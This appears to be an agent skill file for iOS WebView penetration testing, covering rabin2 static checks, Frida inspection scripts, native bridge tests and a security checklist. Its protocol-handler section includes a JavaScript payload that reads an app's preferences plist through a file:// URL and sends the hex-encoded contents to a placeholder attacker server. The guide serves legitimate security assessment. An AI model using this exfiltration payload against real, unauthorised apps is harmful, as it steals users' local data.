---
name: ios-webview-pentest
description: Use this skill whenever testing iOS applications for WebView vulnerabilities, analyzing WebView configurations, investigating WebView-based security issues, or performing mobile security assessments on iOS apps. Trigger this skill for any iOS WebView security testing, static analysis of WebView implementations, dynamic analysis with Frida, protocol handler testing, or native method exposure checks.
---

# iOS WebView Pentesting

A comprehensive skill for testing iOS WebView security configurations and identifying vulnerabilities in mobile applications.

## Overview

WebViews are critical components in iOS applications that display web content. They can be major attack vectors if misconfigured. This skill covers:

- **UIWebView** - Deprecated since iOS 12, cannot disable JavaScript, high XSS risk
- **WKWebView** - Modern replacement, JavaScript can be disabled, better security controls
- **SFSafariViewController** - Safari-based, shares cookies with Safari, JavaScript cannot be disabled

## Static Analysis

### Identify WebView Types in Binary

Use `rabin2` to search for WebView class references:

```bash
# Find UIWebView instances
rabin2 -zz <binary> | egrep "UIWebView$"

# Find WKWebView instances
rabin2 -zz <binary> | egrep "WKWebView$"

# Find WKWebView initialization
rabin2 -zzq <binary> | egrep "WKWebView.*frame"
```

### Check JavaScript Configuration

Verify if JavaScript is properly disabled in WKWebView:

```bash
# Search for javaScriptEnabled property
rabin2 -zz <binary> | grep -i "javascriptenabled"
```

### Check Secure Content Settings

Ensure mixed content is prevented:

```bash
# Search for hasOnlySecureContent property
rabin2 -zz <binary> | grep -i "hasonlysecurecontent"
```

### Find Content Loading Methods

Identify how content is loaded into WebViews:

```bash
# Find HTML loading methods
rabin2 -zz <binary> | grep -i "loadHTMLString"

# Find file loading methods
rabin2 -zz <binary> | grep -i "loadFileURL"
```

## Dynamic Analysis

### Inspect WebView Instances with Frida

Use the bundled `webviews_inspector.js` script to enumerate WebView instances and their configurations:

```bash
frida -U <bundle_id> -l scripts/webviews_inspector.js
```

This script will:
- Find all UIWebView, WKWebView, and SFSafariViewController instances
- Log URLs being loaded
- Check JavaScript enablement status
- Verify secure content settings
- Check file access permissions

### Custom Frida Inspection

For targeted inspection, use these patterns:

```javascript
// Find UIWebView instances
ObjC.choose(ObjC.classes["UIWebView"], {
  onMatch: function (ui) {
    console.log("UIWebView found: ", ui);
    console.log("URL: ", ui.request().toString());
  }
});

// Find WKWebView with config details
ObjC.choose(ObjC.classes["WKWebView"], {
  onMatch: function (wk) {
    console.log("WKWebView found: ", wk);
    console.log("URL: ", wk.URL().toString());
    console.log("JavaScript Enabled: ", wk.configuration().preferences().javaScriptEnabled());
    console.log("Has Only Secure Content: ", wk.hasOnlySecureContent());
  }
});
```

## Protocol Handler Testing

### Test File Access Vulnerabilities

WebViews can expose local files if misconfigured. Test for:

1. **File URL loading** - Check if `loadFileURL:allowingReadAccessToURL:` is used
2. **Universal file access** - Verify `allowUniversalAccessFromFileURLs` is false
3. **File access from file URLs** - Verify `allowFileAccessFromFileURLs` is false

### Test Custom Protocol Handlers

Check for custom URL schemes that might expose functionality:

```bash
# Search for protocol handler implementations
rabin2 -zz <binary> | grep -i "webView:shouldStartLoadWithRequest"
```

### JavaScript File Exfiltration Test

If JavaScript is enabled and file access is possible, test with:

```javascript
// Hex encode file contents and exfiltrate
String.prototype.hexEncode = function () {
  var hex, i, result = "";
  for (i = 0; i < this.length; i++) {
    hex = this.charCodeAt(i).toString(16);
    result += ("000" + hex).slice(-4);
  }
  return result;
};

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", "http://<attacker-server>/" + xhr.responseText.hexEncode(), true);
    xhr2.send(null);
  }
};
xhr.open("GET", "file:///var/mobile/Containers/Data/Application/<app-id>/Library/Preferences/<bundle-id>.plist", true);
xhr.send(null);
```

## Native Method Exposure Testing

### JSContext Access (UIWebView)

For UIWebView, JavaScript can access native objects via JSContext:

```objc
// Objective-C access pattern
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```

### WKWebView Message Handlers

WKWebView uses `postMessage` for JavaScript-to-native communication:

```javascript
// Test message handler invocation
window.webkit.messageHandlers.<handlerName>.postMessage("test data");

// Or via URL scheme
document.location = "<scheme>://<function>/<args>";
```

### Test Native Function Exposure

1. **Identify message handlers** - Look for `addScriptMessageHandler` in binary
2. **Test handler invocation** - Send test messages via JavaScript
3. **Check for sensitive operations** - Look for file access, keychain, network calls

```javascript
// Example test for exposed native functions
function testNativeBridge() {
  try {
    window.webkit.messageHandlers.javaScriptBridge.postMessage(["test", "arg1", "arg2"]);
  } catch(e) {
    console.log("Handler not available or error:", e);
  }
}
```

## Debugging iOS WebViews

### Safari Web Inspector Setup

1. **On iOS Device**:
   - Settings > Safari > Advanced > Enable Web Inspector

2. **On macOS**:
   - Safari > Preferences > Advanced > Show Develop menu

3. **Connect and Debug**:
   - Connect iOS device to Mac
   - Launch the app
   - Safari > Develop > <device-name> > <webview-instance>

**Limitations**:
- Requires macOS with Safari
- Only works for apps installed via Xcode (not App Store apps)

## Security Checklist

- [ ] Identify all WebView types used in the app
- [ ] Verify JavaScript is disabled where not needed
- [ ] Confirm `hasOnlySecureContent` is enabled
- [ ] Check `allowFileAccessFromFileURLs` is false
- [ ] Check `allowUniversalAccessFromFileURLs` is false
- [ ] Test for exposed native methods
- [ ] Verify no sensitive data in WebView URLs
- [ ] Check for custom protocol handlers
- [ ] Test file:// URL loading restrictions
- [ ] Review message handler implementations

## Common Vulnerabilities

1. **JavaScript Injection** - UIWebView cannot disable JavaScript
2. **File Access** - Improper file URL handling exposes local files
3. **Native Method Exposure** - Sensitive functions exposed to JavaScript
4. **Mixed Content** - HTTP content loaded in HTTPS context
5. **Protocol Handler Abuse** - Custom schemes trigger unintended actions

## References

- [OWASP MSTG - Testing Platform Interaction](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction)
- [Where's My Browser iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
- [Debugging iOS WebViews](https://blog.vuplex.com/debugging-webviews)
